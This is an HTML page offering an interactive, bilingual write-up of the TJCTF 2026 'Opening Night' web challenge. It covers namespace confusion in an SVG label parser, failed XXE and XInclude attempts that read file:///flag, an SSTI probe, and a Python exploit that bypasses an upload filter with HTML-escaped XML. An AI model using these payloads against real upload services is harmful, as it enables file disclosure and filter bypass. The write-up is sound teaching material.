@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Yuri08 - TJCTF 2026: Opening Night</title>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" />
+  <style>
+    :root {
+      --main: #7c3aed; --main2: #10b981; --main-light: #a78bfa;
+      --bg: #0f0f1a; --bg2: #181a2a; --glass: rgba(30, 25, 60, 0.9);
+      --text: #e0e7ef; --shadow: 0 8px 32px 0 #7c3aed33;
+      --glow: 0 0 20px 2px #7c3aed44; --highlight: #38bdf8;
+    }
+    html, body {
+      min-height: 100%; margin: 0; font-family: 'JetBrains Mono', monospace;
+      background: radial-gradient(circle at 50% 0%, #1a1a3a 0%, #0f0f1a 100%);
+      color: var(--text); overflow: hidden; perspective: 1000px;
+    }
+    #particles-js {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none;
+    }
+    .content-wrapper {
+      position: relative; z-index: 1; height: 100vh; display: flex; flex-direction: column;
+      padding: 20px; box-sizing: border-box; gap: 15px;
+    }
+    
+    /* Header Profile */
+    .header {
+      display: flex; align-items: center; gap: 20px; padding: 15px;
+      background: var(--glass); border-radius: 1rem; border: 1px solid #7c3aed44;
+      box-shadow: var(--shadow); backdrop-filter: blur(10px); flex-shrink: 0;
+    }
+    .avatar {
+      width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--main);
+      object-fit: cover; box-shadow: 0 0 15px var(--main);
+    }
+    .header-info h1 {
+      font-size: 1.8rem; margin: 0; color: var(--main);
+      text-shadow: 0 0 10px #7c3aed88; animation: neon 2s infinite alternate;
+    }
+    .header-info p { margin: 5px 0 0 0; color: var(--main-light); font-size: 0.9rem; }
+    @keyframes neon { to { text-shadow: 0 0 15px var(--main), 0 0 30px var(--main); } }
+    
+    .lang-toggle {
+      margin-left: auto; background: var(--main); color: white; border: none;
+      padding: 8px 15px; border-radius: 0.5rem; cursor: pointer; font-family: inherit;
+      font-weight: bold; transition: 0.3s; box-shadow: 0 0 10px #7c3aed55;
+    }
+    .lang-toggle:hover { background: var(--main-light); transform: scale(1.05); }
+
+    /* Terminal Body */
+    .terminal-pro {
+      background: linear-gradient(135deg, #12121f 80%, #7c3aed11 100%);
+      border-radius: 1rem; border: 1px solid #312e8155; box-shadow: var(--shadow), var(--glow);
+      display: flex; flex-direction: column; flex-grow: 1; overflow: hidden; position: relative;
+    }
+    .terminal-pro::before {
+      content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+      background: repeating-linear-gradient(0deg, rgba(0,0,0,0.15), rgba(0,0,0,0.15) 1px, transparent 1px, transparent 2px);
+      pointer-events: none; z-index: 2; opacity: 0.2;
+    }
+    .terminal-bar {
+      background: #1e1e2e; height: 2.5rem; display: flex; align-items: center;
+      padding: 0 1rem; border-bottom: 1px solid #312e8155; flex-shrink: 0; z-index: 3;
+    }
+    .dot { width: 12px; height: 12px; border-radius: 50%; margin-right: 6px; }
+    .red { background: #ef4444; } .yellow { background: #facc15; } .green { background: #22c55e; }
+    .terminal-title { color: var(--main-light); margin-left: 1rem; font-weight: bold; letter-spacing: 1px; }
+    
+    .terminal-body {
+      padding: 1.5rem; flex-grow: 1; overflow-y: auto; font-size: 0.95rem;
+      line-height: 1.6; position: relative; z-index: 1; scroll-behavior: smooth;
+    }
+    #terminal-output { white-space: pre-wrap; word-break: break-word; }
+    #terminal-input-line {
+      display: flex; align-items: center; gap: 0.5em; margin-top: 1em; z-index: 3;
+    }
+    #terminal-input {
+      background: transparent; border: none; color: #a7f3d0; outline: none;
+      font-family: inherit; font-size: 1em; width: 100%; caret-color: var(--main2);
+    }
+    
+    /* Syntax Highlighting */
+    .cmd { color: #7c3aed; } .arg { color: #a78bfa; } .info { color: #38bdf8; font-weight: bold; }
+    .error { color: #ef4444; } .success { color: #10b981; } .warning { color: #facc15; }
+    .code-block {
+      background: #0d0d1a; border-left: 3px solid var(--main); padding: 10px 15px;
+      margin: 10px 0; border-radius: 0 5px 5px 0; font-size: 0.9rem; color: #d1d5db;
+    }
+    
+    /* Scrollbar */
+    .terminal-body::-webkit-scrollbar { width: 8px; }
+    .terminal-body::-webkit-scrollbar-track { background: #0f0f1a; }
+    .terminal-body::-webkit-scrollbar-thumb { background: #7c3aed; border-radius: 4px; }
+
+    /* Welcome Screen */
+    #welcome-screen {
+      position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+      background: #0f0f1a; z-index: 10000; display: flex; flex-direction: column;
+      justify-content: center; align-items: center; text-align: center; transition: opacity 0.8s;
+    }
+    #welcome-screen.hidden { opacity: 0; pointer-events: none; }
+    #start-button {
+      background: var(--main); color: white; border: none; border-radius: 0.7rem;
+      padding: 1rem 2rem; font-size: 1.2rem; font-weight: 700; cursor: pointer;
+      font-family: inherit; transition: all 0.3s; box-shadow: 0 0 20px #7c3aed88;
+    }
+    #start-button:hover { background: var(--main-light); transform: translateY(-3px); }
+    
+    #mute-button {
+      position: fixed; top: 20px; right: 20px; z-index: 10001;
+      background: #1e1e2e; color: var(--main-light); border: 1px solid #7c3aed55;
+      border-radius: 50%; width: 40px; height: 40px; font-size: 1.2rem; cursor: pointer;
+      display: flex; justify-content: center; align-items: center; transition: all 0.3s;
+    }
+    #mute-button:hover { background: var(--main); color: white; }
+
+    @media (max-width: 768px) {
+      .header { flex-wrap: wrap; justify-content: center; text-align: center; }
+      .lang-toggle { margin-left: 0; margin-top: 10px; width: 100%; }
+      .avatar { width: 60px; height: 60px; }
+      .header-info h1 { font-size: 1.4rem; }
+    }
+  </style>
+</head>
+<body>
+
+  <div id="welcome-screen">
+    <h1 style="color: var(--main); text-shadow: 0 0 20px var(--main-light); margin-bottom: 20px;">Yuri08 CTF Terminal</h1>
+    <p style="color: #a78bfa; margin-bottom: 30px;">TJCTF 2026 - Web / Opening Night</p>
+    <button id="start-button">Khởi tạo Terminal</button>
+  </div>
+
+  <button id="mute-button" aria-label="Toggle Sound"><i class="bi bi-volume-up-fill"></i></button>
+  <div id="particles-js"></div>
+
+  <div class="content-wrapper">
+    <header class="header">
+      <img src="https://files.catbox.moe/755fgv.png" alt="Avatar" class="avatar" />
+      <div class="header-info">
+        <h1>Yuri08</h1>
+        <p>White-Hat Hacker | Parser Differential Expert</p>
+      </div>
+      <button class="lang-toggle" id="lang-btn" onclick="toggleLang()">Switch to English</button>
+    </header>
+
+    <section class="terminal-pro">
+      <div class="terminal-bar">
+        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+        <span class="terminal-title">root@tjctf:~/opening-night#</span>
+      </div>
+      <div class="terminal-body" id="terminal-body">
+        <pre id="terminal-output"></pre>
+        <div id="terminal-input-line">
+          <span class="cmd">root@tjctf</span>:<span class="arg">~/opening-night</span>$           <input type="text" id="terminal-input" autocomplete="off" spellcheck="false" />
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+  <script>
+    let isMuted = false;
+    let currentLang = 'vi';
+    let userInteracted = false;
+    const output = document.getElementById('terminal-output');
+    const input = document.getElementById('terminal-input');
+    const tBody = document.getElementById('terminal-body');
+
+    particlesJS.load('particles-js', 'https://cdn.jsdelivr.net/gh/VincentGarreau/particles.js/particles.json');
+
+    function playAudio(src, vol=0.2) {
+      if (!userInteracted || isMuted || !src) return;
+      try { const a = new Audio(src); a.volume = vol; a.play(); } catch(e) {}
+    }
+
+    document.getElementById('mute-button').addEventListener('click', function() {
+      isMuted = !isMuted;
+      this.querySelector('i').className = isMuted ? 'bi bi-volume-mute-fill' : 'bi bi-volume-up-fill';
+    });
+
+    function print(html) {
+      const div = document.createElement('div');
+      div.innerHTML = html;
+      output.appendChild(div);
+      tBody.scrollTop = tBody.scrollHeight;
+    }
+
+    // --- TRANSLATIONS & DETAILED WRITEUP DATA ---
+    const L = {
+      vi: {
+        help: `<span class="info">[ Hướng Dẫn Đọc Writeup ]</span>
+<span class="cmd">intro</span>       : Tổng quan Challenge & Gợi ý
+<span class="cmd">bug1</span>        : Lỗ hổng 1 - Namespace Confusion (Phân tích nhãn)
+<span class="cmd">dead1</span>       : Bế tắc 1 - Raw DOCTYPE không hoạt động
+<span class="cmd">dead2</span>       : Bế tắc 2 - External XXE & XInclude bị chặn
+<span class="cmd">dead3</span>       : Bế tắc 3 - Không phải SSTI hay Multipart
+<span class="cmd">break</span>       : Nghịch lý Giải mã - Chìa khóa (Parser Differential)
+<span class="cmd">exploit</span>     : Xây dựng Payload & Khai thác Cuối cùng
+<span class="cmd">code</span>        : Source Code Exploit (Python)
+<span class="cmd">clear</span>       : Xóa màn hình Terminal`,
+        intro: `<span class="info">[ TỔNG QUAN: OPENING NIGHT ]</span>
+<span class="cmd">Category:</span> Web / SVG / Parser Differential
+<span class="cmd">Flag:</span> <span class="success">tjctf{y0ur_4r7w0rk_is_n0w_0n_displ4y}</span>
+
+<span class="warning">Mô tả:</span> "Bộ sưu tập mới mở cửa tối nay." (Trang web cho phép upload SVG và hiển thị như một gallery).
+
+<span class="cmd">Hint 1:</span> Hai người quản lý kiểm tra tác phẩm: một người treo bức tranh (cẩn thận), người kia viết nhãn (cẩu thả).
+<span class="cmd">Hint 2:</span> Người gác cửa chỉ kiểm tra file trông giống SVG ở phần đầu. Người viết nhãn lấy title/desc đầu tiên nó thấy theo tên, chứ không quan tâm đến namespace thật.
+<span class="cmd">Hint 3:</span> Đừng tìm phòng ẩn, hãy thay đổi cách "gói" tác phẩm trước khi nó tới! Payload phải sống sót qua 2 cách diễn giải: một cái vô hại, một cái là XML.
+
+Mục tiêu hiện thị của web:
+<div class="code-block">&lt;h2&gt;some title&lt;/h2&gt;
+&lt;p&gt;some description&lt;/p&gt;
+&lt;dd&gt;700 x 160&lt;/dd&gt;</div>`,
+        bug1: `<span class="info">[ LỖ HỔNG 1: NAMESPACE CONFUSION ]</span>
+Người viết nhãn (Label Parser) lấy title/desc theo tên thẻ, bỏ qua namespace. Thay vì dùng thẻ SVG chuẩn, ta có thể dùng namespace giả:
+
+<div class="code-block">&lt;svg xmlns="http://www.w3.org/2000/svg" width="700" height="160"&gt;
+  &lt;metadata&gt;
+    &lt;x:title xmlns:x="urn:not-svg"&gt;MARK_CUSTOM_TITLE&lt;/x:title&gt;
+    &lt;x:desc xmlns:x="urn:not-svg"&gt;MARK_CUSTOM_DESC&lt;/x:desc&gt;
+  &lt;/metadata&gt;
+  &lt;title&gt;SAFE_TITLE&lt;/title&gt;
+  &lt;desc&gt;SAFE_DESC&lt;/desc&gt;
+&lt;/svg&gt;</div>
+
+Kết quả server trả về:
+<span class="success">h2: 'MARK_CUSTOM_TITLE'</span>
+<span class="success">p : 'MARK_CUSTOM_DESC'</span>
+
+Điều này chứng minh parser dùng hàm kiểu <span class="cmd">find("title")</span> hoặc <span class="cmd">//*[local-name()="title"]</span>, cho phép ta kiểm soát nội dung nhãn dễ dàng. Tuy nhiên, đến đây vẫn chưa ra được flag.`,
+        dead1: `<span class="info">[ BẾ TẮC 1: RAW DOCTYPE KHÔNG EXPAND ]</span>
+Ta đã kiểm soát được nhãn, bước tiếp theo là Entity Expansion. Ta thử payload XML với DOCTYPE chuẩn:
+
+<div class="code-block">&lt;!DOCTYPE svg [
+  &lt;!ENTITY e "ENTITY_OK"&gt;
+]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;metadata&gt;
+    &lt;x:title xmlns:x="urn:not-svg"&gt;&amp;e;&lt;/x:title&gt;
+  &lt;/metadata&gt;
+&lt;/svg&gt;</div>
+
+Kết quả trả về:
+<span class="error">h2: '&e;'</span>
+
+Entity <span class="arg">&e;</span> KHÔNG được mở rộng! Parser đã đọc nó như một chuỗi thuần. Đó là một cạm bẫy lớn, khiến nhiều người tưởng entity expansion không thể dùng được.`,
+        dead2: `<span class="info">[ BẾ TẮC 2: EXTERNAL XXE & XINCLUDE BỊ CHẶN ]</span>
+Vì internal entity thất bại, ta thử các hướng XXE khác:
+- <span class="error">External Entity:</span> <span class="cmd">&lt;!ENTITY xxe SYSTEM "file:///flag"&gt;</span> -> Không đọc được file.
+- <span class="error">OOB Parameter Entities:</span> Dùng webhook.site -> Webhook không nhận được request nào.
+- <span class="error">XInclude:</span> <span class="cmd">&lt;xi:include href="file:///flag" parse="text"/&gt;</span> -> Không được xử lý.
+
+Rõ ràng, external entity loading đã bị vô hiệu hóa hoàn toàn. Đây không phải là bài XXE đọc file thông thường.`,
+        dead3: `<span class="info">[ BẾ TẮC 3: KHÔNG PHẢI SSTI HAY MULTIPART ]</span>
+Gợi ý nhắc đến việc "thay đổi cách gói", nên ta thử:
+- <span class="cmd">Multipart Confusion:</span> Gửi cả text field và file field, duplicate file parts, thay đổi Content-Transfer-Encoding (base64, quoted-printable). -> App luôn dùng file part thật và từ chối base64.
+- <span class="cmd">SSTI:</span> Upload label chứa <span class="arg">{{7*7}}</span> -> Server in y nguyên ra màn hình.
+
+Tất cả các hướng nhập môn đều thất bại!`,
+        break: `<span class="info">[ NGHỊCH LÝ GIẢI MÃ: PARSER DIFFERENTIAL ]</span>
+Chìa khóa nằm ở hint: "Payload phải sống sót qua 2 cách diễn giải. Một cái vô hại, một cái là XML."
+
+Nếu ta HTML-escape toàn bộ file XML trước khi upload:
+<div class="code-block">&amp;lt;svg xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot; width=&amp;quot;700&amp;quot; height=&amp;quot;160&amp;quot;&amp;gt;
+  &amp;lt;metadata&amp;gt;
+    &amp;lt;x:title xmlns:x=&amp;quot;urn:not-svg&amp;quot;&amp;gt;WHOLE_TITLE&amp;lt;/x:title&amp;gt;
+  &amp;lt;/metadata&amp;gt;
+&amp;lt;/svg&amp;gt;</div>
+
+Người gác cửa (Gatekeeper) thấy nó chỉ là text an toàn (hợp lệ để qua cổng). Nhưng ống kính phía sau đã <span class="success">html.unescape()</span> nó trước khi parse XML!
+Vì vậy, XML parser nhận được tài liệu XML hoàn chỉnh và sạch sẽ. Đó là lỗi <span class="cmd">Parser Differential</span> (Chênh lệch xử lý giữa 2 stage).`,
+        exploit: `<span class="info">[ KHAI THÁC CUỐI CÙNG: INTERNAL ENTITY TRONG DECODED XML ]</span>
+Nhờ bug HTML-unescape, ta có thể đặt DOCTYPE ở vị trí hợp lệ (đầu văn bản) trong file đã decode!
+
+<div class="code-block">&lt;!DOCTYPE svg [
+  &lt;!ENTITY e "FINAL_ENTITY_OK"&gt;
+]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" width="700" height="160"&gt;
+  &lt;metadata&gt;
+    &lt;x:title xmlns:x="urn:not-svg"&gt;&amp;e;&lt;/x:title&gt;
+    &lt;x:desc xmlns:x="urn:not-svg"&gt;FINAL_DESC&lt;/x:desc&gt;
+  &lt;/metadata&gt;
+  &lt;title&gt;SAFE&lt;/title&gt;
+  &lt;desc&gt;SAFE&lt;/desc&gt;
+&lt;/svg&gt;</div>
+
+Ta HTML-escape TOÀN BỘ đoạn XML trên rồi upload. 
+1. Gatekeeper thấy chuỗi escape -> Cho qua.
+2. Stage 2 gọi <span class="cmd">html.unescape()</span> -> DOCTYPE và Entity xuất hiện hợp lệ.
+3. XML Parser mở rộng Entity <span class="arg">&e;</span>.
+4. Label Parser lấy <span class="success">FINAL_ENTITY_OK</span> làm Title.
+-> FLAG XUẤT HIỆN!`,
+        code: `<span class="info">[ EXPLOIT SOURCE CODE ]</span>
+<div class="code-block">#!/usr/bin/env python3
+import html, re, sys, time
+from urllib.parse import urljoin
+import requests
+
+BASE = sys.argv[1].strip("'\"").rstrip("/")
+FLAG_RE = re.compile(r"tjctf\\{[^}]+\\}", re.I)
+
+def build_payload():
+    inner_xml = '''&lt;!DOCTYPE svg [
+  &lt;!ENTITY e "FINAL_ENTITY_OK"&gt;
+]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" width="700" height="160"&gt;
+  &lt;metadata&gt;
+    &lt;x:title xmlns:x="urn:not-svg"&gt;&amp;e;&lt;/x:title&gt;
+    &lt;x:desc xmlns:x="urn:not-svg"&gt;FINAL_DESC&lt;/x:desc&gt;
+  &lt;/metadata&gt;
+  &lt;title&gt;SAFE&lt;/title&gt;
+  &lt;desc&gt;SAFE&lt;/desc&gt;
+  &lt;rect width="100%" height="100%" fill="white"/&gt;
+&lt;/svg&gt;
+'''
+    # Quan trọng: HTML-escape toàn bộ tài liệu XML 1 lần duy nhất
+    return html.escape(inner_xml, quote=True).encode()
+
+def main():
+    s = requests.Session()
+    action, field = find_form(s) # (Giả lập hàm tìm form)
+    payload = build_payload()
+
+    for _ in range(10):
+        r = s.post(action, files={field: ("opening.svg", payload, "image/svg+xml")}, allow_redirects=True, timeout=30)
+        m = FLAG_RE.search(r.text)
+        if m:
+            print("[+] FLAG:", m.group(0))
+            return
+        print("[!] No flag in response.")
+        return
+
+if __name__ == "__main__":
+    main()</div>`
+      },
+      en: {
+        help: `<span class="info">[ WRITEUP NAVIGATION ]</span>
+<span class="cmd">intro</span>       : Challenge Overview & Hints
+<span class="cmd">bug1</span>        : Bug 1 - Namespace Confusion (Label Parser)
+<span class="cmd">dead1</span>       : Dead End 1 - Raw DOCTYPE does not expand
+<span class="cmd">dead2</span>       : Dead End 2 - External XXE & XInclude blocked
+<span class="cmd">dead3</span>       : Dead End 3 - Not SSTI or Multipart
+<span class="cmd">break</span>       : The Decode Paradox - Parser Differential Key
+<span class="cmd">exploit</span>     : Payload Construction & Final Exploit
+<span class="cmd">code</span>        : Exploit Source Code (Python)
+<span class="cmd">clear</span>       : Clear Terminal Screen`,
+        intro: `<span class="info">[ OVERVIEW: OPENING NIGHT ]</span>
+<span class="cmd">Category:</span> Web / SVG / Parser Differential
+<span class="cmd">Flag:</span> <span class="success">tjctf{y0ur_4r7w0rk_is_n0w_0n_displ4y}</span>
+
+<span class="warning">Description:</span> "The new gallery opens tonight." (A website allowing SVG uploads and displaying them like a gallery).
+
+<span class="cmd">Hint 1:</span> Two curators inspect each piece: one hangs the painting (carefully), the other writes the label (sloppily).
+<span class="cmd">Hint 2:</span> The gatekeeper only checks that your file looks like an SVG at the top. The label writer takes the first title/desc it sees by name, ignoring true namespace.
+<span class="cmd">Hint 3:</span> Don't look for hidden rooms, change how your art is "wrapped"! Payload must survive two interpretations: harmless text vs. XML.
+
+Website output sinks:
+<div class="code-block">&lt;h2&gt;some title&lt;/h2&gt;
+&lt;p&gt;some description&lt;/p&gt;
+&lt;dd&gt;700 x 160&lt;/dd&gt;</div>`,
+        bug1: `<span class="info">[ BUG 1: NAMESPACE CONFUSION ]</span>
+The label writer ignores namespaces. Instead of standard SVG metadata, we use a fake namespace:
+
+<div class="code-block">&lt;svg xmlns="http://www.w3.org/2000/svg" width="700" height="160"&gt;
+  &lt;metadata&gt;
+    &lt;x:title xmlns:x="urn:not-svg"&gt;MARK_CUSTOM_TITLE&lt;/x:title&gt;
+    &lt;x:desc xmlns:x="urn:not-svg"&gt;MARK_CUSTOM_DESC&lt;/x:desc&gt;
+  &lt;/metadata&gt;
+  &lt;title&gt;SAFE_TITLE&lt;/title&gt;
+  &lt;desc&gt;SAFE_DESC&lt;/desc&gt;
+&lt;/svg&gt;</div>
+
+Server renders:
+<span class="success">h2: 'MARK_CUSTOM_TITLE'</span>
+<span class="success">p : 'MARK_CUSTOM_DESC'</span>
+
+This proves the parser uses something like <span class="cmd">find("title")</span> or <span class="cmd">//*[local-name()="title"]</span>. We control the label, but still no flag.`,
+        dead1: `<span class="info">[ DEAD END 1: RAW DOCTYPE DOES NOT EXPAND ]</span>
+We control the label, next step is Entity Expansion. We try a raw XML document with internal entity:
+
+<div class="code-block">&lt;!DOCTYPE svg [
+  &lt;!ENTITY e "ENTITY_OK"&gt;
+]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;metadata&gt;
+    &lt;x:title xmlns:x="urn:not-svg"&gt;&amp;e;&lt;/x:title&gt;
+  &lt;/metadata&gt;
+&lt;/svg&gt;</div>
+
+Output:
+<span class="error">h2: '&e;'</span>
+
+The entity <span class="arg">&e;</span> is NOT expanded! The parser reads it as raw text. A major trap making people think entity expansion is impossible.`,
+        dead2: `<span class="info">[ DEAD END 2: EXTERNAL XXE & XINCLUDE BLOCKED ]</span>
+Since internal entities failed in the raw path, we try other XXE vectors:
+- <span class="error">External Entity:</span> <span class="cmd">&lt;!ENTITY xxe SYSTEM "file:///flag"&gt;</span> -> No file leak.
+- <span class="error">OOB Parameter Entities:</span> Using webhook.site -> No request received.
+- <span class="error">XInclude:</span> <span class="cmd">&lt;xi:include href="file:///flag" parse="text"/&gt;</span> -> Not processed.
+
+External entity loading is completely disabled. This is not a standard "read /flag with XXE" challenge.`,
+        dead3: `<span class="info">[ DEAD END 3: NOT SSTI OR MULTIPART ]</span>
+The hint mentions "wrapping", so we test:
+- <span class="cmd">Multipart Confusion:</span> Text field + file field, duplicate parts, Content-Transfer-Encoding (base64). -> App uses the real file part, rejects base64.
+- <span class="cmd">SSTI:</span> Upload label containing <span class="arg">{{7*7}}</span> -> Printed literally.
+
+All entry-level vectors fail!`,
+        break: `<span class="info">[ THE DECODE PARADOX: PARSER DIFFERENTIAL ]</span>
+The key is the hint: "Your payload must survive two different interpretations. One as harmless text, and the other as XML."
+
+If we HTML-escape the entire XML file before uploading:
+<div class="code-block">&amp;lt;svg xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot; width=&amp;quot;700&amp;quot; height=&amp;quot;160&amp;quot;&amp;gt;
+  &amp;lt;metadata&amp;gt;
+    &amp;lt;x:title xmlns:x=&amp;quot;urn:not-svg&amp;quot;&amp;gt;WHOLE_TITLE&amp;lt;/x:title&amp;gt;
+  &amp;lt;/metadata&amp;gt;
+&amp;lt;/svg&amp;gt;</div>
+
+The Gatekeeper sees harmless text (valid to pass). But the backend calls <span class="success">html.unescape()</span> before parsing it as XML!
+So, the XML parser receives a perfectly valid, clean XML document. This is the <span class="cmd">Parser Differential</span> bug.`,
+        exploit: `<span class="info">[ FINAL EXPLOIT: INTERNAL ENTITY IN DECODED XML ]</span>
+Because of the unescape bug, we can place the DOCTYPE at the valid position (document start) in the decoded file!
+
+<div class="code-block">&lt;!DOCTYPE svg [
+  &lt;!ENTITY e "FINAL_ENTITY_OK"&gt;
+]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" width="700" height="160"&gt;
+  &lt;metadata&gt;
+    &lt;x:title xmlns:x="urn:not-svg"&gt;&amp;e;&lt;/x:title&gt;
+    &lt;x:desc xmlns:x="urn:not-svg"&gt;FINAL_DESC&lt;/x:desc&gt;
+  &lt;/metadata&gt;
+  &lt;title&gt;SAFE&lt;/title&gt;
+  &lt;desc&gt;SAFE&lt;/desc&gt;
+&lt;/svg&gt;</div>
+
+We HTML-escape the ENTIRE XML above and upload it.
+1. Gatekeeper sees escaped string -> Allows upload.
+2. Stage 2 calls <span class="cmd">html.unescape()</span> -> DOCTYPE & Entity become real.
+3. XML Parser expands Entity <span class="arg">&e;</span>.
+4. Label Parser takes <span class="success">FINAL_ENTITY_OK</span> as Title.
+-> FLAG APPEARS!`,
+        code: `<span class="info">[ EXPLOIT SOURCE CODE ]</span>
+<div class="code-block">#!/usr/bin/env python3
+import html, re, sys, time
+from urllib.parse import urljoin
+import requests
+
+BASE = sys.argv[1].strip("'\"").rstrip("/")
+FLAG_RE = re.compile(r"tjctf\\{[^}]+\\}", re.I)
+
+def build_payload():
+    inner_xml = '''&lt;!DOCTYPE svg [
+  &lt;!ENTITY e "FINAL_ENTITY_OK"&gt;
+]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" width="700" height="160"&gt;
+  &lt;metadata&gt;
+    &lt;x:title xmlns:x="urn:not-svg"&gt;&amp;e;&lt;/x:title&gt;
+    &lt;x:desc xmlns:x="urn:not-svg"&gt;FINAL_DESC&lt;/x:desc&gt;
+  &lt;/metadata&gt;
+  &lt;title&gt;SAFE&lt;/title&gt;
+  &lt;desc&gt;SAFE&lt;/desc&gt;
+  &lt;rect width="100%" height="100%" fill="white"/&gt;
+&lt;/svg&gt;
+'''
+    # Critical: escape the whole XML document exactly once.
+    return html.escape(inner_xml, quote=True).encode()
+
+def main():
+    s = requests.Session()
+    action, field = find_form(s) # (Mock form finder)
+    payload = build_payload()
+
+    for _ in range(10):
+        r = s.post(action, files={field: ("opening.svg", payload, "image/svg+xml")}, allow_redirects=True, timeout=30)
+        m = FLAG_RE.search(r.text)
+        if m:
+            print("[+] FLAG:", m.group(0))
+            return
+        print("[!] No flag in response.")
+        return
+
+if __name__ == "__main__":
+    main()</div>`
+      }
+    };
+
+    function toggleLang() {
+      currentLang = currentLang === 'vi' ? 'en' : 'vi';
+      const btn = document.getElementById('lang-btn');
+      btn.textContent = currentLang === 'vi' ? 'Switch to English' : 'Chuyển sang Tiếng Việt';
+      handleCommand('clear');
+      handleCommand('help');
+      playAudio('https://www.soundjay.com/buttons/button-1.mp3', 0.3);
+    }
+
+    const cmds = {
+      help: () => L[currentLang].help,
+      intro: () => L[currentLang].intro,
+      bug1: () => L[currentLang].bug1,
+      dead1: () => L[currentLang].dead1,
+      dead2: () => L[currentLang].dead2,
+      dead3: () => L[currentLang].dead3,
+      break: () => L[currentLang].break,
+      exploit: () => L[currentLang].exploit,
+      code: () => L[currentLang].code,
+      clear: () => { output.innerHTML = ''; return ''; },
+      banner: () => `<span class="info">
+  ____                    _   _             _   _           _   
+ / __ \\                  | | (_)           | | | |         | |  
+| |  | |_ __   ___ _ __ | |_ _  ___  _ __ | |_| | __ _   _| |_ 
+| |  | | '_ \\ / _ \\ '_ \\| __| |/ _ \\| '_ \\|  _  |/ _\\ | | | __|
+| |__| | |_) |  __/ | | | |_| | (_) | | | | | | | (_| | |_| | |_ 
+ \\____/| .__/ \\___|_| |_|\\__|_|\\___/|_| |_|\\_| |_/\\__,_|\\__,_|\\__|
+       | |                                                        
+       |_|</span>`
+    };
+
+    function handleCommand(cmd) {
+      const c = cmd.trim().toLowerCase();
+      if(!c) return;
+      print(`<span class="cmd">root@tjctf</span>:<span class="arg">~/opening-night</span>$ ${cmd}`);
+      playAudio('https://www.soundjay.com/buttons/button-5.mp3', 0.15);
+      
+      if (cmds[c]) {
+        const res = cmds[c]();
+        if (res) print(res);
+      } else {
+        print(`<span class="error">Command not found: ${c}. Type 'help' for navigation.</span>`);
+      }
+      input.value = '';
+    }
+
+    input.addEventListener('keydown', e => {
+      if (e.key === 'Enter') { e.preventDefault(); handleCommand(input.value); }
+      else playAudio('https://www.soundjay.com/buttons/button-8.mp3', 0.02);
+    });
+
+    tBody.addEventListener('click', () => input.focus());
+
+    // Welcome Logic
+    document.getElementById('start-button').addEventListener('click', () => {
+      userInteracted = true;
+      const ws = document.getElementById('welcome-screen');
+      ws.classList.add('hidden');
+      setTimeout(() => { handleCommand('banner'); handleCommand('help'); input.focus(); }, 800);
+      playAudio('https://www.soundjay.com/buttons/button-10.mp3', 0.4);
+    });
+  </script>
+</body>
+</html>
